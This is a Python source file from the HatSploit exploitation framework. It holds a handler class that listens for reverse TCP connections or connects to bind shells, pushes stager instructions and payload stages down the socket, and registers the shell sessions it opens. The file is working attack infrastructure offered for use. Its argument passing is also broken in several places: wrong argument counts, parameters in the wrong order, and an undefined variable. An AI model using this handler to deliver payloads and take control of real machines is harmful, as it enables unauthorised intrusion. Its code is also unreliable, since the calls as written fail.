#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.base.sessions import Sessions
from core.base.storage import LocalStorage
from core.cli.badges import Badges
from core.modules.modules import Modules
from data.utils.handler.handler.session import HatSploitSession
from utils.http.http import HTTPClient
from utils.tcp.tcp import TCPClient


class Handler(TCPClient, HTTPClient):
    sessions = Sessions()
    local_storage = LocalStorage()
    modules = Modules()
    badges = Badges()

    def listen_session(self, local_host, local_port, timeout=None, session=HatSploitSession):
        try:
            client, address = self.listen(local_host, local_port, timeout)
            session = session()
            session.open(client)
            return session, address
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return None, None

    def connect_session(self, remote_host, remote_port, timeout=10, session=HatSploitSession):
        try:
            client = self.connect_server(remote_host, remote_port, timeout)
            session = session()
            session.open(client)
            return session
        except Exception:
            self.badges.output_error("Failed to handle session!")
            return None

    def set_session_details(self, payload, session):
        if not session.details['Type']:
            session.details['Type'] = 'custom'

        session.details['Platform'] = payload['Platform']
        return session

    def handle_bind_session(self, remote_host, remote_port, payload, timout=None, session=HatSploitSession):
        new_session = self.connect_session(remote_host, remote_port, session)

        if not new_session:
            return False

        if payload['Category'] in ['stager']:
            if payload['Instructions'] and payload['Payload']:
                instructions = payload['Instructions']
                stage = payload['Payload']
                stage_session = payload['Session']

                self.badges.output_process("Sending payload stage...")
                new_session.client.sock.send(instructions.encode() if isinstance(instructions, str) else instructions)
                if instructions != stage:
                    new_session.client.sock.send(stage.encode() if isinstance(stage, str) else stage)
                new_session.close()

                if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
                    self.badges.output_warning("Payload completed but no session was created.")
                    return True

                if stage_session is not None:
                    session = stage_session

                if payload['Type'].lower() == 'bind_tcp':
                    new_session = self.connect_session(remote_host, remote_port, session)
                    if not new_session:
                        self.badges.output_warning("Payload completed but no session was created.")
                        return True

                if payload['Type'].lower() == 'reverse_tcp':
                    local_host, local_port = self.tcp.get_local_host(), remote_port

                    new_session, remote_host = self.listen_session(local_host, local_port, session)
                    if not new_session and not remote_host:
                        self.badges.output_warning("Payload completed but no session was created.")
                        return True
            else:
                self.badges.output_warning("Payload you provided is not executable.")

        if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
            self.badges.output_warning("Payload completed but no session was created.")
            return True

        new_session = self.set_session_details(payload, new_session)
        session_platform = new_session.details['Platform']
        session_type = new_session.details['Type']

        session_id = self.sessions.add_session(session_platform, session_type, remote_host, remote_port, new_session)
        self.badges.output_success("Session " + str(session_id) + " opened!")
        return True

    def handle_reverse_session(self, local_host, local_port, payload, session=HatSploitSession):
        if payload['Category'] in ['stager']:
            if payload['Instructions'] and payload['Payload']:
                instructions = payload['Instructions']
                stage = payload['Payload']
                stage_session = payload['Session']

                new_session, remote_host = self.listen_session(local_host, local_port, session)
                if not new_session and not remote_host:
                    return False

                self.badges.output_process("Sending payload stage...")
                new_session.client.sock.send(instructions.encode() if isinstance(instructions, str) else instructions)
                if instructions != stage:
                    new_session.client.sock.send(stage.encode() if isinstance(stage, str) else stage)
                new_session.close()

                if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
                    self.badges.output_warning("Payload completed but no session was created.")
                    return True

                if stage_session is not None:
                    session = stage_session

                if payload['Type'].lower() == 'bind_tcp':
                    new_session = self.connect_session(remote_host, remote_port, session)
                    if not new_session:
                        self.badges.output_warning("Payload completed but no session was created.")
                        return True

                    new_session = self.set_session_details(payload, new_session)
                    session_platform = new_session.details['Platform']
                    session_type = new_session.details['Type']

                    session_id = self.sessions.add_session(session_platform, session_type, remote_host, local_port, new_session)
                    self.badges.output_success("Session " + str(session_id) + " opened!")
                    return True
            else:
                self.badges.output_warning("Payload you provided is not executable.")

        new_session, remote_host = self.listen_session(local_host, local_port, session)
        if not new_session and not remote_host:
            return False

        if payload['Type'].lower() not in ['bind_tcp', 'reverse_tcp']:
            self.badges.output_warning("Payload completed but no session was created.")
            return True

        new_session = self.set_session_details(payload, new_session)
        session_platform = new_session.details['Platform']
        session_type = new_session.details['Type']

        session_id = self.sessions.add_session(session_platform, session_type, remote_host, local_port, new_session)
        self.badges.output_success("Session " + str(session_id) + " opened!")
        return True

    def handle_session(self, host, port, method, payload, timeout=None, session=HatSploitSession):
        if method.lower() == 'reverse':
            return self.handle_reverse_session(host, port, payload, session, timeout)
        if method.lower() == 'bind':
            return self.handle_bind_session(host, port, payload, session, timeout)
        return None
